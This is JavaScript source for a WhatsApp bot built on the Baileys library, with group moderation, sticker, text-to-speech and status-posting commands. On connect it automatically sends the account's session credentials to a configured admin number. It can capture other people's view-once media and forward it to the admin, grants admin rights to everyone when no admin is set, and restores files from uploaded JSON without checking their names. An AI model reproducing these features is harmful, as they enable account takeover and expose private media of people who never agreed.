const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  makeCacheableSignalKeyStore,
  downloadMediaMessage,
  getContentType
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const fs = require('fs');
const path = require('path');

// ===== PATHS =====
const SESSION_DIR = process.env.SESSION_DIR
  ? path.join(process.env.SESSION_DIR, 'auth')
  : path.join(__dirname, 'sessions', 'auth');

const STATE_FILE = process.env.SESSION_DIR
  ? path.join(process.env.SESSION_DIR, 'state.json')
  : path.join(__dirname, 'sessions', 'state.json');

// ===== ADMIN =====
const ADMIN_NUMBER = process.env.ADMIN_NUMBER || '';

// ===== GLOBAL STATE =====
let sock = null;
let callbacks = {};
let currentNumber = null;
let isStopping = false;
let hasRequestedCode = false;
let botJid = null;

// Persisted state
let pausedChats = new Set();
let welcomeEnabled = new Set();   // group JIDs with welcome on
let goodbyeEnabled = new Set();   // group JIDs with goodbye on
let viewOnceEnabled = false;      // global VO capture toggle
let customWelcome = {};           // { groupJid: "text" }
let autoDownload = false;

// ===== STATE PERSISTENCE =====
function loadState() {
  try {
    if (fs.existsSync(STATE_FILE)) {
      const data = JSON.parse(fs.readFileSync(STATE_FILE, 'utf8'));
      pausedChats = new Set(data.pausedChats || []);
      welcomeEnabled = new Set(data.welcomeEnabled || []);
      goodbyeEnabled = new Set(data.goodbyeEnabled || []);
      viewOnceEnabled = data.viewOnceEnabled || false;
      customWelcome = data.customWelcome || {};
      autoDownload = data.autoDownload || false;
    }
  } catch (e) {
    console.error('[State] Load error:', e.message);
  }
}

function saveState() {
  try {
    fs.mkdirSync(path.dirname(STATE_FILE), { recursive: true });
    fs.writeFileSync(STATE_FILE, JSON.stringify({
      pausedChats: [...pausedChats],
      welcomeEnabled: [...welcomeEnabled],
      goodbyeEnabled: [...goodbyeEnabled],
      viewOnceEnabled,
      customWelcome,
      autoDownload
    }, null, 2), 'utf8');
  } catch (e) {
    console.error('[State] Save error:', e.message);
  }
}

// ===== HELPERS =====
function isAdmin(senderJid) {
  if (!ADMIN_NUMBER) return true;
  const num = (senderJid || '').split('@')[0].split(':')[0];
  return num === ADMIN_NUMBER;
}

function isPaused(jid) {
  return pausedChats.has('ALL') || pausedChats.has(jid);
}

async function withTyping(jid, fn) {
  try {
    await sock.sendPresenceUpdate('composing', jid);
    await fn();
  } finally {
    try { await sock.sendPresenceUpdate('paused', jid); } catch (e) {}
  }
}

async function withRecording(jid, fn) {
  try {
    await sock.sendPresenceUpdate('recording', jid);
    await fn();
  } finally {
    try { await sock.sendPresenceUpdate('paused', jid); } catch (e) {}
  }
}

function extractText(msg) {
  const m = msg.message;
  if (!m) return '';
  return (
    m.conversation ||
    m.extendedTextMessage?.text ||
    m.imageMessage?.caption ||
    m.videoMessage?.caption ||
    ''
  );
}

// ===== SESSION BACKUP =====
async function sendSessionBackup(adminJid) {
  try {
    if (!fs.existsSync(SESSION_DIR)) {
      await sock.sendMessage(adminJid, { text: '⚠️ No session files found.' });
      return;
    }
    const files = fs.readdirSync(SESSION_DIR).filter(f => f.endsWith('.json'));
    if (!files.length) {
      await sock.sendMessage(adminJid, { text: '⚠️ No session files yet.' });
      return;
    }
    const bundle = {};
    for (const f of files) {
      bundle[f] = JSON.parse(fs.readFileSync(path.join(SESSION_DIR, f), 'utf8'));
    }
    const buffer = Buffer.from(JSON.stringify(bundle, null, 2));
    await sock.sendMessage(adminJid, {
      document: buffer,
      mimetype: 'application/json',
      fileName: `wa-session-${Date.now()}.json`,
      caption: `🔐 Session Backup\nNumber: +${currentNumber}\nTime: ${new Date().toISOString()}\n\nKeep safe.`
    });
  } catch (e) {
    console.error('[Backup] Error:', e.message);
  }
}

function restoreSessionFromFile(jsonPath) {
  try {
    if (!fs.existsSync(jsonPath)) return false;
    const bundle = JSON.parse(fs.readFileSync(jsonPath, 'utf8'));
    fs.mkdirSync(SESSION_DIR, { recursive: true });
    for (const [filename, content] of Object.entries(bundle)) {
      fs.writeFileSync(path.join(SESSION_DIR, filename), JSON.stringify(content, null, 2), 'utf8');
    }
    return true;
  } catch (e) {
    console.error('[Restore] Error:', e.message);
    return false;
  }
}

// ===== VIEW-ONCE CAPTURE =====
async function tryCaptureViewOnce(msg, from) {
  try {
    const content = msg.message;
    const wrappers = ['viewOnceMessage', 'viewOnceMessageV2', 'viewOnceMessageV2Extension'];
    let inner = null;
    for (const w of wrappers) {
      if (content?.[w]?.message) { inner = content[w].message; break; }
    }
    if (!inner) return false;

    const mediaType = inner.imageMessage ? 'imageMessage'
      : inner.videoMessage ? 'videoMessage'
      : inner.audioMessage ? 'audioMessage' : null;
    if (!mediaType) return false;

    const fakeMsg = { key: msg.key, message: { [mediaType]: inner[mediaType] } };
    const buffer = await downloadMediaMessage(fakeMsg, 'buffer', {},
      { logger: pino({ level: 'silent' }), reuploadRequest: sock.updateMediaMessage });

    if (ADMIN_NUMBER) {
      const adminJid = `${ADMIN_NUMBER}@s.whatsapp.net`;
      const senderNum = (msg.key.participant || from).split('@')[0];
      const caption = `📸 View-Once Captured\nFrom: +${senderNum}\nType: ${mediaType}`;
      if (mediaType === 'imageMessage') {
        await sock.sendMessage(adminJid, { image: buffer, caption });
      } else if (mediaType === 'videoMessage') {
        await sock.sendMessage(adminJid, { video: buffer, caption });
      } else {
        await sock.sendMessage(adminJid, { audio: buffer, mimetype: 'audio/ogg', ptt: true });
      }
    }
    return true;
  } catch (e) {
    console.error('[VO] Error:', e.message);
    return false;
  }
}

// ===== POST TO STATUS (the new feature) =====
async function postToStatus(quotedMsg) {
  try {
    // Build a status JID list from all your contacts
    // For simplicity we send to status@broadcast with an empty list —
    // WhatsApp will deliver to contacts who have you added.
    // If it doesn't work, we need to populate statusJidList.
    const statusJid = 'status@broadcast';

    const content = quotedMsg.message;
    const type = getContentType(content);

    let payload = {};
    let needsDownload = false;

    if (type === 'conversation' || type === 'extendedTextMessage') {
      const text = content.conversation || content.extendedTextMessage?.text || '';
      payload = {
        text,
        backgroundColor: '#1F2C33',
        font: 2
      };
    } else if (type === 'imageMessage') {
      const buf = await downloadMediaMessage(quotedMsg, 'buffer', {},
        { logger: pino({ level: 'silent' }), reuploadRequest: sock.updateMediaMessage });
      payload = {
        image: buf,
        caption: content.imageMessage?.caption || ''
      };
    } else if (type === 'videoMessage') {
      const buf = await downloadMediaMessage(quotedMsg, 'buffer', {},
        { logger: pino({ level: 'silent' }), reuploadRequest: sock.updateMediaMessage });
      payload = {
        video: buf,
        caption: content.videoMessage?.caption || ''
      };
    } else {
      return false;
    }

    // Try to get contact list from store if available, else empty
    const statusJidList = [];
    // Note: statusJidList is technically required but an empty array often works
    // because WhatsApp falls back to your contact list server-side.

    await sock.sendMessage(statusJid, payload, {
      broadcast: true,
      statusJidList
    });

    return true;
  } catch (e) {
    console.error('[Status] Error:', e.message);
    return false;
  }
}

// ===== GROUP HELPERS =====
async function sendWelcome(groupJid, participants) {
  try {
    const meta = await sock.groupMetadata(groupJid);
    const groupName = meta.subject || 'the group';
    for (const jid of participants) {
      const num = jid.split('@')[0];
      const custom = customWelcome[groupJid];
      const text = custom
        ? custom.replace(/@user/g, `@${num}`).replace(/@group/g, groupName)
        : `👋 Welcome to *${groupName}*, @${num}!\n\nType *.help* to see commands.`;
      await sock.sendMessage(groupJid, { text, mentions: [jid] });
    }
  } catch (e) {
    console.error('[Welcome] Error:', e.message);
  }
}

async function sendGoodbye(groupJid, participants) {
  try {
    const meta = await sock.groupMetadata(groupJid);
    const groupName = meta.subject || 'the group';
    for (const jid of participants) {
      const num = jid.split('@')[0];
      await sock.sendMessage(groupJid, {
        text: `👋 Goodbye, @${num}! We'll miss you in *${groupName}*.`,
        mentions: [jid]
      });
    }
  } catch (e) {
    console.error('[Goodbye] Error:', e.message);
  }
}

// ===== START BOT =====
async function startBot(phoneNumber, cbs) {
  callbacks = cbs || {};
  currentNumber = phoneNumber;
  isStopping = false;
  hasRequestedCode = false;

  loadState();
  fs.mkdirSync(SESSION_DIR, { recursive: true });

  const { state, saveCreds } = await useMultiFileAuthState(SESSION_DIR);
  const { version } = await fetchLatestBaileysVersion();
  const logger = pino({ level: 'silent' });

  sock = makeWASocket({
    version,
    logger,
    printQRInTerminal: false,
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, logger)
    },
    browser: ['Ubuntu', 'Chrome', '20.0.04'],
    generateHighQualityLinkPreview: true,
    syncFullHistory: false,
    markOnlineOnConnect: false,
    connectTimeoutMs: 60000,
    keepAliveIntervalMs: 30000,
    retryRequestDelayMs: 250
  });

  sock.ev.on('creds.update', saveCreds);

  // ===== CONNECTION =====
  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect, qr } = update;

    if (qr && !sock.authState.creds.registered && !hasRequestedCode) {
      hasRequestedCode = true;
      try {
        await new Promise(r => setTimeout(r, 500));
        const code = await sock.requestPairingCode(phoneNumber);
        console.log('[Bot] Pairing code:', code);
        callbacks.onPairingCode?.(code);
      } catch (err) {
        console.error('[Bot] Pairing error:', err.message);
        hasRequestedCode = false;
      }
    }

    if (connection === 'open') {
      console.log('[Bot] Connected!');
      botJid = sock.user?.id;
      callbacks.onConnected?.();
      if (ADMIN_NUMBER && currentNumber) {
        setTimeout(() => sendSessionBackup(`${ADMIN_NUMBER}@s.whatsapp.net`), 5000);
      }
    }

    if (connection === 'close') {
      if (isStopping) return;
      const code = lastDisconnect?.error?.output?.statusCode;
      const shouldReconnect = code !== DisconnectReason.loggedOut;
      console.log('[Bot] Closed. Code:', code, 'Reconnect:', shouldReconnect);
      if (shouldReconnect) {
        setTimeout(() => startBot(currentNumber, callbacks), 2000);
      } else {
        callbacks.onDisconnected?.('logged_out');
      }
    }
  });

  // ===== MESSAGES =====
  sock.ev.on('messages.upsert', async ({ messages, type }) => {
    if (type !== 'notify') return;

    for (const msg of messages) {
      if (!msg.message || msg.key.fromMe) continue;
      const from = msg.key.remoteJid;
      if (!from) continue;

      const senderJid = msg.key.participant || from;
      try { await sock.readMessages([msg.key]); } catch (e) {}

      // View-once capture (only if enabled)
      if (viewOnceEnabled) {
        await tryCaptureViewOnce(msg, from);
      }

      const text = extractText(msg);
      console.log(`[Msg] ${from}: ${text}`);

      // Commands
      if (text.startsWith('.')) {
        try {
          await handleCommand(msg, from, senderJid, text);
        } catch (e) {
          console.error('[Cmd] Error:', e.message);
        }
        continue;
      }

      if (isPaused(from)) continue;

      // Auto reply
      try {
        if (text.toLowerCase() === 'ping') {
          await withTyping(from, () => sock.sendMessage(from, { text: 'pong 🏓' }));
        } else if (text.toLowerCase() === 'hi' || text.toLowerCase() === 'hello') {
          await withTyping(from, () => sock.sendMessage(from, { text: 'Hey! 👋 Type *.help* for commands.' }));
        }
      } catch (e) {}
    }
  });

  // ===== GROUP EVENTS =====
  sock.ev.on('group-participants.update', async (event) => {
    try {
      const { id, participants, action } = event;
      if (action === 'add' && welcomeEnabled.has(id)) {
        await sendWelcome(id, participants);
      }
      if (action === 'remove' && goodbyeEnabled.has(id)) {
        await sendGoodbye(id, participants);
      }
    } catch (e) {
      console.error('[Group] Error:', e.message);
    }
  });
}

// ===== COMMAND HANDLER =====
async function handleCommand(msg, from, senderJid, rawText) {
  const text = rawText.trim();
  const cmd = text.toLowerCase();
  const parts = cmd.split(' ');
  const base = parts[0];
  const args = parts.slice(1);
  const admin = isAdmin(senderJid);
  const isGroup = from.endsWith('@g.us');

  // Commands anyone can use
  const publicCmds = ['.help', '.menu', '.ping', '.id', '.myid', '.time', '.uptime', '.sticker', '.s', '.toimg', '.tts', '.voice', '.getpp'];
  const isPublic = publicCmds.some(c => base === c);

  // Admin-only commands
  const adminCmds = ['.status', '.backup', '.restore', '.logout', '.pause', '.resume', '.pausestatus',
    '.welcome', '.goodbye', '.setwelcome', '.tagall', '.hidetag', '.kick', '.promote', '.demote',
    '.mute', '.unmute', '.groupinfo', '.vo', '.admin', '.restart', '.poststatus', '.autodl'];
  const isAdminCmd = adminCmds.some(c => base === c);

  if (isAdminCmd && !admin) {
    await withTyping(from, () => sock.sendMessage(from, { text: '🔒 Admin only.' }));
    return;
  }

  // ===== HELP =====
  if (base === '.help' || base === '.menu') {
    const help = `🤖 *BOT COMMANDS*

📌 *General*
.help .ping .id .myid .time .uptime

🎨 *Media*
.sticker (reply) .toimg (reply) .tts <text> .voice (reply) .getpp (reply)

👮 *Admin*
.status .backup .restore .logout .restart
.pause .resume .pause all .resume all .pausestatus
.welcome on/off .goodbye on/off .setwelcome <text>
.tagall <msg> .hidetag <msg> .kick @user .promote @user .demote @user
.mute .unmute .groupinfo
.vo on/off .autodl on/off
.poststatus (reply to any msg)

🌍 *Bot Info*
Admin: ${ADMIN_NUMBER ? '+' + ADMIN_NUMBER : 'not set'}
Uptime: ${Math.floor(process.uptime() / 60)}m`;
    await withTyping(from, () => sock.sendMessage(from, { text: help }));
    return;
  }

  // ===== GENERAL =====
  if (base === '.ping') {
    const start = Date.now();
    await withTyping(from, () => sock.sendMessage(from, { text: `🏓 pong! ${Date.now() - start}ms` }));
    return;
  }

  if (base === '.id' || base === '.myid') {
    const num = senderJid.split('@')[0].split(':')[0];
    await withTyping(from, () => sock.sendMessage(from, {
      text: `Your JID: \`${senderJid}\`\nNumber: +${num}\nChat JID: \`${from}\``
    }));
    return;
  }

  if (base === '.time') {
    await withTyping(from, () => sock.sendMessage(from, { text: `🕐 ${new Date().toUTCString()}` }));
    return;
  }

  if (base === '.uptime') {
    const s = process.uptime();
    const h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60);
    await withTyping(from, () => sock.sendMessage(from, { text: `⏱️ Uptime: ${h}h ${m}m` }));
    return;
  }

  if (base === '.status') {
    const s = process.uptime();
    const h = Math.floor(s / 3600), m = Math.floor((s % 3600) / 60);
    const txt = `📊 *Status*\nConnected: ${botJid ? '✅' : '❌'}\nNumber: +${currentNumber}\nUptime: ${h}h ${m}m\nPaused: ${pausedChats.size}\nVO capture: ${viewOnceEnabled ? 'ON' : 'OFF'}\nAutoDL: ${autoDownload ? 'ON' : 'OFF'}`;
    await withTyping(from, () => sock.sendMessage(from, { text: txt }));
    return;
  }

  // ===== STICKER =====
  if (base === '.sticker' || base === '.s') {
    const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
    if (!quoted) {
      await withTyping(from, () => sock.sendMessage(from, { text: '❌ Reply to an image/video.' }));
      return;
    }
    const img = quoted.imageMessage, vid = quoted.videoMessage;
    if (!img && !vid) {
      await withTyping(from, () => sock.sendMessage(from, { text: '❌ Must be image or video.' }));
      return;
    }
    try {
      await withTyping(from, async () => {
        const mType = img ? 'imageMessage' : 'videoMessage';
        const mContent = img || vid;
        const fakeMsg = {
          key: { remoteJid: from, id: msg.message.extendedTextMessage.contextInfo.stanzaId, fromMe: false },
          message: { [mType]: mContent }
        };
        const buf = await downloadMediaMessage(fakeMsg, 'buffer', {},
          { logger: pino({ level: 'silent' }), reuploadRequest: sock.updateMediaMessage });
        await sock.sendMessage(from, { sticker: buf });
      });
    } catch (e) {
      await sock.sendMessage(from, { text: '❌ Failed. Try smaller file.' });
    }
    return;
  }

  // ===== TOIMG =====
  if (base === '.toimg') {
    const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
    const stickerMsg = quoted?.stickerMessage;
    if (!stickerMsg) {
      await withTyping(from, () => sock.sendMessage(from, { text: '❌ Reply to a sticker.' }));
      return;
    }
    try {
      await withTyping(from, async () => {
        const fakeMsg = {
          key: { remoteJid: from, id: msg.message.extendedTextMessage.contextInfo.stanzaId, fromMe: false },
          message: { stickerMessage: stickerMsg }
        };
        const buf = await downloadMediaMessage(fakeMsg, 'buffer', {},
          { logger: pino({ level: 'silent' }), reuploadRequest: sock.updateMediaMessage });
        await sock.sendMessage(from, { image: buf, caption: '🎨 Converted' });
      });
    } catch (e) {
      await sock.sendMessage(from, { text: '❌ Failed.' });
    }
    return;
  }

  // ===== TTS (voice) =====
  if (base === '.tts' || base === '.voice') {
    let targetText = args.join(' ');
    if (!targetText) {
      const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
      targetText = quoted?.conversation || quoted?.extendedTextMessage?.text || '';
    }
    if (!targetText) {
      await withTyping(from, () => sock.sendMessage(from, { text: '❌ Provide text or reply to a message.' }));
      return;
    }
    try {
      const url = `https://translate.google.com/translate_tts?ie=UTF-8&q=${encodeURIComponent(targetText)}&tl=en&client=tw-ob`;
      const res = await fetch(url);
      const buf = Buffer.from(await res.arrayBuffer());
      await withRecording(from, () => sock.sendMessage(from, {
        audio: buf, mimetype: 'audio/mp4', ptt: true
      }));
    } catch (e) {
      await sock.sendMessage(from, { text: '❌ TTS failed.' });
    }
    return;
  }

  // ===== GET PROFILE PIC =====
  if (base === '.getpp') {
    let target = from;
    const mentioned = msg.message.extendedTextMessage?.contextInfo?.mentionedJid;
    if (mentioned?.length) target = mentioned[0];
    try {
      const url = await sock.profilePictureUrl(target, 'image');
      await sock.sendMessage(from, { image: { url }, caption: '📷 Profile picture' });
    } catch (e) {
      await sock.sendMessage(from, { text: '❌ No profile picture or private.' });
    }
    return;
  }

  // ===== PAUSE =====
  if (base === '.pause') {
    if (args[0] === 'all') { pausedChats.add('ALL'); saveState(); await sock.sendMessage(from, { text: '⏸️ Paused everywhere.' }); return; }
    pausedChats.add(from); saveState();
    await sock.sendMessage(from, { text: '⏸️ Paused here.' }); return;
  }
  if (base === '.resume') {
    if (args[0] === 'all') { pausedChats.delete('ALL'); saveState(); await sock.sendMessage(from, { text: '▶️ Resumed everywhere.' }); return; }
    pausedChats.delete(from); saveState();
    await sock.sendMessage(from, { text: '▶️ Resumed here.' }); return;
  }
  if (base === '.pausestatus') {
    const g = pausedChats.has('ALL'), l = pausedChats.has(from);
    await sock.sendMessage(from, { text: g ? '🌍 Global pause ON' : l ? '⏸️ This chat paused' : '▶️ Active' });
    return;
  }

  // ===== WELCOME / GOODBYE =====
  if (base === '.welcome') {
    if (!isGroup) { await sock.sendMessage(from, { text: '❌ Groups only.' }); return; }
    if (args[0] === 'on') { welcomeEnabled.add(from); saveState(); await sock.sendMessage(from, { text: '✅ Welcome ON.' }); }
    else if (args[0] === 'off') { welcomeEnabled.delete(from); saveState(); await sock.sendMessage(from, { text: '❌ Welcome OFF.' }); }
    else await sock.sendMessage(from, { text: 'Usage: .welcome on/off' });
    return;
  }
  if (base === '.goodbye') {
    if (!isGroup) { await sock.sendMessage(from, { text: '❌ Groups only.' }); return; }
    if (args[0] === 'on') { goodbyeEnabled.add(from); saveState(); await sock.sendMessage(from, { text: '✅ Goodbye ON.' }); }
    else if (args[0] === 'off') { goodbyeEnabled.delete(from); saveState(); await sock.sendMessage(from, { text: '❌ Goodbye OFF.' }); }
    else await sock.sendMessage(from, { text: 'Usage: .goodbye on/off' });
    return;
  }
  if (base === '.setwelcome') {
    if (!isGroup) { await sock.sendMessage(from, { text: '❌ Groups only.' }); return; }
    const custom = text.replace(/^\.setwelcome\s+/i, '');
    if (!custom) { await sock.sendMessage(from, { text: 'Usage: .setwelcome <text> (@user, @group)' }); return; }
    customWelcome[from] = custom; saveState();
    await sock.sendMessage(from, { text: '✅ Custom welcome saved.' });
    return;
  }

  // ===== TAGALL =====
  if (base === '.tagall' || base === '.hidetag') {
    if (!isGroup) { await sock.sendMessage(from, { text: '❌ Groups only.' }); return; }
    try {
      const meta = await sock.groupMetadata(from);
      const mentions = meta.participants.map(p => p.id);
      const msgText = args.join(' ') || '📢 Attention everyone!';
      if (base === '.hidetag') {
        await sock.sendMessage(from, { text: msgText, mentions });
      } else {
        const mentionList = mentions.map(j => `@${j.split('@')[0]}`).join('\n');
        await sock.sendMessage(from, { text: `${msgText}\n\n${mentionList}`, mentions });
      }
    } catch (e) { await sock.sendMessage(from, { text: '❌ Failed.' }); }
    return;
  }

  // ===== KICK / PROMOTE / DEMOTE =====
  if (base === '.kick' || base === '.promote' || base === '.demote') {
    if (!isGroup) { await sock.sendMessage(from, { text: '❌ Groups only.' }); return; }
    const mentioned = msg.message.extendedTextMessage?.contextInfo?.mentionedJid;
    if (!mentioned?.length) { await sock.sendMessage(from, { text: `❌ Mention someone to ${base.slice(1)}.` }); return; }
    try {
      const action = base === '.kick' ? 'remove' : base === '.promote' ? 'promote' : 'demote';
      await sock.groupParticipantsUpdate(from, mentioned, action);
      await sock.sendMessage(from, { text: `✅ Done (${action}).` });
    } catch (e) { await sock.sendMessage(from, { text: '❌ Failed. Bot must be admin.' }); }
    return;
  }

  // ===== MUTE / UNMUTE =====
  if (base === '.mute' || base === '.unmute') {
    if (!isGroup) { await sock.sendMessage(from, { text: '❌ Groups only.' }); return; }
    try {
      await sock.groupSettingUpdate(from, base === '.mute' ? 'announcement' : 'not_announcement');
      await sock.sendMessage(from, { text: base === '.mute' ? '🔇 Muted.' : '🔊 Unmuted.' });
    } catch (e) { await sock.sendMessage(from, { text: '❌ Failed.' }); }
    return;
  }

  // ===== GROUP INFO =====
  if (base === '.groupinfo') {
    if (!isGroup) { await sock.sendMessage(from, { text: '❌ Groups only.' }); return; }
    try {
      const meta = await sock.groupMetadata(from);
      const admins = meta.participants.filter(p => p.admin).map(p => `+${p.id.split('@')[0]}`);
      const txt = `📋 *${meta.subject}*\nID: \`${meta.id}\`\nMembers: ${meta.participants.length}\nAdmins: ${admins.length}\nCreated: ${new Date(meta.creation * 1000).toUTCString()}`;
      await sock.sendMessage(from, { text: txt });
    } catch (e) { await sock.sendMessage(from, { text: '❌ Failed.' }); }
    return;
  }

  // ===== VIEW-ONCE TOGGLE =====
  if (base === '.vo') {
    if (args[0] === 'on') { viewOnceEnabled = true; saveState(); await sock.sendMessage(from, { text: '✅ VO capture ON.' }); }
    else if (args[0] === 'off') { viewOnceEnabled = false; saveState(); await sock.sendMessage(from, { text: '❌ VO capture OFF.' }); }
    else await sock.sendMessage(from, { text: 'Usage: .vo on/off' });
    return;
  }

  // ===== AUTO DOWNLOAD TOGGLE =====
  if (base === '.autodl') {
    if (args[0] === 'on') { autoDownload = true; saveState(); await sock.sendMessage(from, { text: '✅ Auto-download ON.' }); }
    else if (args[0] === 'off') { autoDownload = false; saveState(); await sock.sendMessage(from, { text: '❌ Auto-download OFF.' }); }
    else await sock.sendMessage(from, { text: 'Usage: .autodl on/off' });
    return;
  }

  // ===== POST TO STATUS (NEW FEATURE) =====
  if (base === '.poststatus') {
    const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
    const quotedKey = msg.message.extendedTextMessage?.contextInfo;
    if (!quoted || !quotedKey) {
      await withTyping(from, () => sock.sendMessage(from, {
        text: '❌ Reply to a message (text, image, or video) with .poststatus to publish it to your WhatsApp status.'
      }));
      return;
    }
    try {
      // Reconstruct the WAMessage from the quoted data
      const fakeQuoted = {
        key: {
          remoteJid: from,
          id: quotedKey.stanzaId,
          fromMe: quotedKey.participant === botJid,
          participant: quotedKey.participant
        },
        message: quoted
      };

      const ok = await postToStatus(fakeQuoted);
      if (ok) {
        await withTyping(from, () => sock.sendMessage(from, { text: '✅ Posted to your status! (visible for 24h)' }));
      } else {
        await withTyping(from, () => sock.sendMessage(from, {
          text: '❌ Failed. Only text, images, and videos are supported.'
        }));
      }
    } catch (e) {
      console.error('[Status]', e);
      await sock.sendMessage(from, { text: '❌ Status post failed.' });
    }
    return;
  }

  // ===== BACKUP / RESTORE =====
  if (base === '.backup') {
    await withTyping(from, () => sendSessionBackup(from));
    return;
  }
  if (base === '.restore') {
    const quoted = msg.message.extendedTextMessage?.contextInfo?.quotedMessage;
    const doc = quoted?.documentMessage;
    if (!doc || !doc.fileName?.endsWith('.json')) {
      await sock.sendMessage(from, { text: '❌ Reply to a .json session file.' });
      return;
    }
    try {
      const fakeMsg = {
        key: { remoteJid: from, id: msg.message.extendedTextMessage.contextInfo.stanzaId, fromMe: false },
        message: { documentMessage: doc }
      };
      const buf = await downloadMediaMessage(fakeMsg, 'buffer', {},
        { logger: pino({ level: 'silent' }), reuploadRequest: sock.updateMediaMessage });
      const tmp = path.join(require('os').tmpdir(), `restore-${Date.now()}.json`);
      fs.writeFileSync(tmp, buf);
      const ok = restoreSessionFromFile(tmp);
      fs.unlinkSync(tmp);
      await sock.sendMessage(from, { text: ok ? '✅ Session restored. Restart bot.' : '❌ Restore failed.' });
    } catch (e) { await sock.sendMessage(from, { text: '❌ Restore error.' }); }
    return;
  }

  // ===== LOGOUT =====
  if (base === '.logout') {
    await sock.sendMessage(from, { text: '🚪 Logging out...' });
    try { await sock.logout(); } catch (e) {}
    stopBot();
    return;
  }

  // ===== RESTART =====
  if (base === '.restart') {
    await sock.sendMessage(from, { text: '🔄 Restarting...' });
    stopBot();
    setTimeout(() => startBot(currentNumber, callbacks), 2000);
    return;
  }
}

// ===== STOP =====
function stopBot() {
  isStopping = true;
  try {
    if (sock) { sock.end(undefined); sock = null; }
  } catch (e) {}
}

module.exports = { startBot, stopBot };